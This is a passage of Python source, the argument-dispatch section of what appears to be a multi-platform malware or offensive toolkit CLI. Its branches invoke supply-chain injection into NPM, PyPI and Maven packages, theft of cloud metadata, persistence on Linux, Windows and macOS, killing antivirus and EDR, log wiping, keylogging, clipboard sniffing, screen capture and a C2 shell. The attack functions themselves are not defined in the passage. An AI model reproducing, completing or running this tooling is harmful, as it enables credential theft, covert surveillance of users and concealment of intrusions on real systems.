    if args.can_run:
        name, target = args.can_run
        # Dynamically call can_run_on if exists
        try:
            mod = _load_exploit_module(name)
            if hasattr(mod, "can_run_on"):
                ok = mod.can_run_on(target)
                print(f"[+] can_run_on('{name}','{target}') → {ok}")
            else:
                print(f"[i] Exploit {name} has no can_run_on() function.")
        except Exception as e:
            print(f"[!] Error loading exploit {name}: {e}")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Supply‑Chain & Cloud
    if args.npm_inject:
        pkg, payload = args.npm_inject
        print(f"[+] Attempting NPM supply‑chain inject: package={pkg}, payload={payload}")
        success = npm_supply_chain_inject(pkg, payload)
        print(f"** Success: {success}")
        sys.exit(0)

    if args.pip_inject:
        pkg, payload = args.pip_inject
        print(f"[+] Attempting PyPI supply‑chain inject: package={pkg}, payload={payload}")
        success = pip_supply_chain_inject(pkg, payload)
        print(f"** Success: {success}")
        sys.exit(0)

    if args.maven_inject:
        gav, payload = args.maven_inject
        group, art = gav.split(":", 1)
        print(f"[+] Attempting Maven inject: {group}:{art} with {payload}")
        success = maven_supply_chain_inject(group, art, payload)
        print(f"** Success: {success}")
        sys.exit(0)

    if args.cloud_aws:
        print("[+] Stealing AWS metadata and enumerating S3 buckets...")
        res = aws_metadata_steal()
        print(f"Result: {res}")
        sys.exit(0)

    if args.cloud_azure:
        print("[+] Stealing Azure metadata and enumerating Blobs...")
        res = azure_metadata_steal()
        print(f"Result: {res}")
        sys.exit(0)

    if args.cloud_gcp:
        print("[+] Stealing GCP metadata and enumerating GCS buckets...")
        res = gcp_metadata_steal()
        print(f"Result: {res}")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Persistence
    if args.persist_linux:
        script = args.persist_linux
        print(f"[+] Installing Linux systemd + udev persistence for {script} ...")
        ok1 = linux_systemd_service(script)
        ok2 = linux_udev_rule()
        print(f"** systemd: {ok1}, udev: {ok2}")
        sys.exit(0)

    if args.persist_win_schtask:
        script = args.persist_win_schtask
        print(f"[+] Creating Windows Scheduled Task for {script} ...")
        ok = windows_schtask(script)
        print(f"** Scheduled Task created: {ok}")
        sys.exit(0)

    if args.persist_win_rkey:
        script = args.persist_win_rkey
        print(f"[+] Adding Run key persistence for {script} ...")
        ok = windows_run_key(script)
        print(f"** Run key added: {ok}")
        sys.exit(0)

    if args.persist_mac_daemon:
        script = args.persist_mac_daemon
        print(f"[+] Installing macOS LaunchDaemon for {script} ...")
        ok = macos_launchdaemon(script)
        print(f"** LaunchDaemon installed: {ok}")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Stealth & Anti‑Forensics
    if args.stealth:
        print("[+] Starting stealth sequence (kill AV/EDR, unload rootkit)...")
        threading.Thread(target=stealth_loop, daemon=True).start()
        print("[*] Stealth loop running in background.")
        sys.exit(0)

    if args.wipe_logs:
        print("[+] Wiping logs on this OS...")
        if sys.platform.startswith("linux"):
            clear_linux_logs()
        elif sys.platform == "darwin":
            clear_macos_tcc()
        else:
            clear_windows_logs()
        print("[*] Logs wiped.")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Keylogging & Sensitive Capture
    if args.start_keylogger:
        db_path = args.start_keylogger
        print(f"[+] Starting keylogger, saving to {db_path} ...")
        threading.Thread(target=keylogger_loop, args=(db_path,), daemon=True).start()
        print("[*] Keylogger thread started.")
        sys.exit(0)

    if args.start_clip_sniffer:
        db_path = args.start_clip_sniffer
        print(f"[+] Starting clipboard sniffer, saving to {db_path} ...")
        threading.Thread(target=clipboard_sniffer, args=(db_path,), daemon=True).start()
        print("[*] Clipboard sniffer thread started.")
        sys.exit(0)

    if args.start_screen_cap:
        val = args.start_screen_cap
        if ":" not in val:
            print("[!] Provide DB_PATH:KEYWORD")
            sys.exit(1)
        db_path, keyword = val.split(":", 1)
        print(f"[+] Starting screen capture on keyword '{keyword}', saving to {db_path} ...")
        threading.Thread(target=screen_capture_on_keyword, args=(db_path, keyword), daemon=True).start()
        print("[*] Screen capture thread started.")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Defensive Utilities
    if args.firewall_audit:
        print("[+] Auditing firewall rules...")
        audit_firewall()
        sys.exit(0)

    if args.log_inspect:
        print("[+] Inspecting recent system logs...")
        inspect_logs()
        sys.exit(0)

    if args.remediate:
        print(f"[+] Attempting remediation for {args.remediate} ...")
        remediate(args.remediate)
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # C2 Interaction
    if args.launch_dispatcher:
        print("[+] Launching full Bismillah dispatcher...")
        # Note: spawns as a subprocess so this CLI can exit if desired
        os.execv(sys.executable, [sys.executable, os.path.join(os.path.dirname(__file__), "bismillah.py")])
        # os.execv replaces this process; if you prefer to spawn in background:
        # subprocess.Popen([sys.executable, "bismillah.py"])
        # print("[*] Dispatcher started in background.")
        sys.exit(0)

    if args.c2_shell:
        interactive_c2_shell()
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # If no arguments provided, print help
    parser.print_help()
    sys.exit(1)


if __name__ == "__main__":
    main()
